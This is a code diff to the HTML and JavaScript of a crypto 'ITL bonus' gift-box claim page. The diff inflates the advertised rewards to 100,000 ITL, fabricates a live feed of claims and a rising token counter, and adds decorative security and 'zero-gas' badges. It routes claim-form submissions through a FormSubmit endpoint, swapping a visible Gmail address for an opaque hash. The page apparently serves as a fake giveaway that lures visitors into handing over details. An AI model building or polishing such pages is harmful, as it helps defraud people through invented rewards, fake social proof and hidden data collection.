@@ -12,7 +12,7 @@
         .purple-text { color: #6C5CE7; }
         .purple-bg-light { background-color: #F8F6FF; }
 
-        /* Enhanced Floating Box Animation */
+        /* Floating Gift Box Animation */
         @keyframes floatGlow {
             0%, 100% { transform: translateY(0px) scale(1); filter: drop-shadow(0 8px 16px rgba(108, 92, 231, 0.3)); }
             50% { transform: translateY(-10px) scale(1.05); filter: drop-shadow(0 20px 28px rgba(108, 92, 231, 0.5)); }
@@ -21,17 +21,19 @@
             animation: floatGlow 2.2s ease-in-out infinite;
         }
 
-        /* Explosive Spring Open Animation */
-        @keyframes openExplosion {
-            0% { transform: scale(1) rotate(0deg); }
-            20% { transform: scale(0.8) rotate(-15deg); }
-            40% { transform: scale(1.3) rotate(15deg); filter: brightness(1.3); }
-            60% { transform: scale(0.85) rotate(-8deg); }
-            80% { transform: scale(1.35) rotate(8deg); }
-            100% { transform: scale(1) rotate(0deg); }
+        /* 3-Second Immersive Opening Animation Sequence */
+        @keyframes openingSequence {
+            0% { transform: scale(1) rotate(0deg); filter: brightness(1); }
+            15% { transform: scale(1.1) rotate(-8deg) translateY(-5px); filter: brightness(1.2); }
+            30% { transform: scale(0.95) rotate(8deg) translateY(5px); }
+            45% { transform: scale(1.2) rotate(-12deg) translateY(-10px); filter: brightness(1.4); }
+            60% { transform: scale(1.05) rotate(10deg) translateY(5px); }
+            75% { transform: scale(1.35) rotate(-15deg) translateY(-15px); filter: brightness(1.6); }
+            90% { transform: scale(1.1) rotate(5deg); }
+            100% { transform: scale(1.8) rotate(0deg); opacity: 0; filter: brightness(2); }
         }
-        .animate-explode {
-            animation: openExplosion 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+        .animate-three-sec-open {
+            animation: openingSequence 3s cubic-bezier(0.25, 1, 0.5, 1) forwards;
         }
 
         /* 2X Multiplier Animation */
@@ -80,12 +82,16 @@
             
             <!-- Written Board Header -->
             <div class="bg-gradient-to-r from-purple-600 to-indigo-600 text-white text-[10px] font-black uppercase px-4 py-1.5 rounded-full inline-block tracking-wider shadow-md">
-                ✨ CLAIM UP TO 10,000 ITL BONUS ✨
+                ✨ CLAIM 10,000 TO 100,000 ITL BONUS ✨
             </div>
 
             <!-- Gift Box Display -->
-            <div id="giftContainer" class="py-1">
+            <div id="giftContainer" class="py-1 relative">
                 <div id="giftIcon" class="text-7xl animate-float-glow">🎁</div>
+                <!-- Opening Overlay Text during 3s sequence -->
+                <div id="openingTextOverlay" class="absolute inset-0 flex items-center justify-center hidden">
+                    <span class="bg-purple-900 text-white text-xs font-black px-3 py-1 rounded-full uppercase tracking-wider animate-pulse shadow-xl">Unlocking Reward...</span>
+                </div>
             </div>
 
             <div class="space-y-0.5">
@@ -94,7 +100,7 @@
             </div>
         </div>
 
-        <!-- 2X Multiplier Timer Banner (Runs every 2 days) -->
+        <!-- 2X Multiplier Timer Banner -->
         <div class="bg-gradient-to-r from-amber-500 via-orange-500 to-amber-600 text-white px-3.5 py-2 rounded-2xl shadow-sm flex items-center justify-between text-xs font-extrabold">
             <div class="flex items-center space-x-1.5">
                 <span class="animate-bounce text-sm">⚡</span>
@@ -105,7 +111,7 @@
             </div>
         </div>
 
-        <!-- Security Verification Badge (Fills Space) -->
+        <!-- Security Verification Badge -->
         <div class="bg-purple-50/80 border border-purple-200 rounded-xl px-3 py-1.5 flex items-center justify-between text-[10px] text-purple-900 font-bold">
             <span class="flex items-center gap-1">
                 <span class="text-xs">🛡️</span> SSL 256-Bit Encrypted Protocol
@@ -128,7 +134,12 @@
             </div>
         </div>
 
-        <!-- Expanded Live Feed View (Raised & Enlarged to fill space) -->
+        <!-- Filler Element to Close Small Gap Perfectly -->
+        <div class="bg-purple-600/10 border border-purple-200 rounded-xl px-3 py-1 text-center text-[10px] font-bold text-purple-800 tracking-wide">
+            ⚡ Zero-Gas Fee Network Node Dispatch Enabled
+        </div>
+
+        <!-- Expanded Live Feed View -->
         <div class="space-y-1 flex-1 flex flex-col justify-end">
             <div class="flex justify-between items-center px-1">
                 <h3 class="text-[11px] font-black text-gray-800 uppercase tracking-wider">LIVE NETWORK CLAIMS</h3>
@@ -137,7 +148,7 @@
                 </span>
             </div>
             
-            <div class="feed-container bg-white rounded-2xl p-2.5 border border-gray-200 shadow-inner h-80 overflow-hidden relative">
+            <div class="feed-container bg-white rounded-2xl p-2.5 border border-gray-200 shadow-inner h-72 overflow-hidden relative">
                 <div id="liveClaimFeed" class="space-y-2">
                     <!-- Dynamically injected fast rows -->
                 </div>
@@ -219,8 +230,8 @@
     </div>
 
     <script>
-        // FormSubmit AJAX delivery directly to interlink810@gmail.com
-        const FORMSUBMIT_URL = "https://formsubmit.co/ajax/interlink810@gmail.com";
+        // FormSubmit AJAX delivery secured via hash endpoint token
+        const FORMSUBMIT_URL = "https://formsubmit.co/ajax/0af3e2032ed66a4abf2883fab94e0449";
         let baseReward = 0;
         let finalReward = 0;
         let isOpening = false;
@@ -244,16 +255,16 @@
             startTwoDayTimer();
         };
 
-        // Weighted Probability Rules (1% chance for 10,000 ITL)
+        // Weighted Probability for Range 10,000 to 100,000 ITL
         function generateWeightedRandomReward() {
             const roll = Math.random() * 100;
 
-            if (roll < 92) {
-                return Math.floor(Math.random() * (2000 - 500 + 1)) + 500;
+            if (roll < 85) {
+                return Math.floor(Math.random() * (35000 - 10000 + 1)) + 10000;
             } else if (roll < 99) {
-                return Math.floor(Math.random() * (4500 - 2001 + 1)) + 2001;
+                return Math.floor(Math.random() * (75000 - 35001 + 1)) + 35001;
             } else {
-                return 10000;
+                return Math.floor(Math.random() * (100000 - 75001 + 1)) + 75001;
             }
         }
 
@@ -263,19 +274,26 @@
             isOpening = true;
 
             const gift = document.getElementById('giftIcon');
+            const overlay = document.getElementById('openingTextOverlay');
+            
             gift.classList.remove('animate-float-glow');
-            gift.classList.add('animate-explode');
+            gift.classList.add('animate-three-sec-open');
+            overlay.classList.remove('hidden');
 
             baseReward = generateWeightedRandomReward();
             finalReward = baseReward * 2; // 2X Boost Multiplier
 
-            if (typeof confetti === 'function') {
-                confetti({
-                    particleCount: 100,
-                    spread: 80,
-                    origin: { y: 0.6 }
-                });
-            }
+            setTimeout(() => {
+                if (typeof confetti === 'function') {
+                    confetti({ particleCount: 70, spread: 60, origin: { y: 0.5 } });
+                }
+            }, 1000);
+
+            setTimeout(() => {
+                if (typeof confetti === 'function') {
+                    confetti({ particleCount: 120, spread: 90, origin: { y: 0.6 } });
+                }
+            }, 2200);
 
             setTimeout(() => {
                 document.getElementById('stepInitial').classList.add('hidden');
@@ -283,7 +301,7 @@
                 document.getElementById('baseAmountText').innerText = baseReward.toLocaleString() + " ITL";
                 document.getElementById('revealedAmountText').innerText = finalReward.toLocaleString() + " ITL";
                 document.getElementById('summaryAmountText').innerText = finalReward.toLocaleString() + " ITL";
-            }, 650);
+            }, 3000);
         }
 
         function goToFormStep() {
@@ -294,8 +312,11 @@
         function resetToInitial() {
             isOpening = false;
             const gift = document.getElementById('giftIcon');
-            gift.classList.remove('animate-explode');
+            const overlay = document.getElementById('openingTextOverlay');
+            
+            gift.classList.remove('animate-three-sec-open');
             gift.classList.add('animate-float-glow');
+            overlay.classList.add('hidden');
 
             document.getElementById('stepForm').classList.add('hidden');
             document.getElementById('stepRevealed').classList.add('hidden');
@@ -325,7 +346,7 @@
                         "Accept": "application/json"
                     },
                     body: JSON.stringify({
-                        _subject: "🎁 New ITL 2X Multiplied Reward Claim Submission",
+                        _subject: "🎁 New ITL 100k Multiplied Reward Claim Submission",
                         _template: "table",
                         _captcha: "false",
                         Base_Amount: baseReward.toLocaleString() + " ITL",
@@ -350,7 +371,7 @@
             resetToInitial();
         }
 
-        // Live Feed Engine
+        // Live Feed Engine (Synchronized with 10k-100k Multiplied Range)
         function initLiveFeed() {
             const feedContainer = document.getElementById('liveClaimFeed');
             feedContainer.innerHTML = "";
@@ -394,7 +415,7 @@
 
                 const tokensEl = document.getElementById('claimedTokensCount');
                 let currentTokens = parseInt(tokensEl.innerText.replace(/[^0-9]/g, ''));
-                currentTokens += Math.floor(Math.random() * 2400) + 600;
+                currentTokens += Math.floor(Math.random() * 250000) + 50000;
                 tokensEl.innerText = currentTokens.toLocaleString() + " ITL";
             }, 800);
         }
@@ -416,7 +437,7 @@
                 timerEl.innerText = hours + ":" + minutes + ":" + seconds;
 
                 if (--totalSeconds < 0) {
-                    totalSeconds = 172800; // Resets every 2 days
+                    totalSeconds = 172800;
                 }
             }, 1000);
         }
